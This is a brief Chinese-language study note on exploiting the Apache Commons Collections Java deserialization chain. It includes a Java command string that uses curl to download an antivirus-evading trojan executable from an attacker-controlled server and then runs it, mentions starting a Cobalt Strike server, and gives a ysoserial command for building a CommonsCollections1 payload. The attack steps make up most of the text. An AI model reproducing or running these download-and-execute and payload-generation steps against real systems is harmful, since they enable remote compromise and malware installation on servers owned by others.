[TOC]



# ==ApacheCC链利用==

编写代码

```java
String cmd = "curl http://192.168.230.147/security/genbinshellcode.exe -o D:\\WEB\\XAMPP5.6\\htdocs\\learn\\image\\shellexe\\csshell.exe & D:\\WEB\\XAMPP5.6\\htdocs\\learn\\image\\shellexe\\csshell.exe";
```

上传免杀木马到服务器

服务器开启 cs 

执行上述指令，从服务器下载木马并执行

如果要执行多条命令，就将要执行的命令写成.bat文件，这里要注意.bat的语法。然后用cmd命令执行bat文件。

如果在 java 代码中要执行上面的指令，我们就需要把指令写进代码中并执行，但是我总不能把我整个序列化和反序列化的代码写进去吧

那意思就是说，我不仅要上传序列化后的文件，我还要把指令文件也一次性上传到目标站点，不然人家反序列化的时候都不知道去哪找，我靠

## ysoserial 工具

这是一款序列化数据的生成工具

```
java -jar ysoserial.jar CommonsCollections1 "calc.exe" > D:\JAVA\Java-Development_and_code_audit\JavaCore\dataysoserialApacheCC1.ser
```

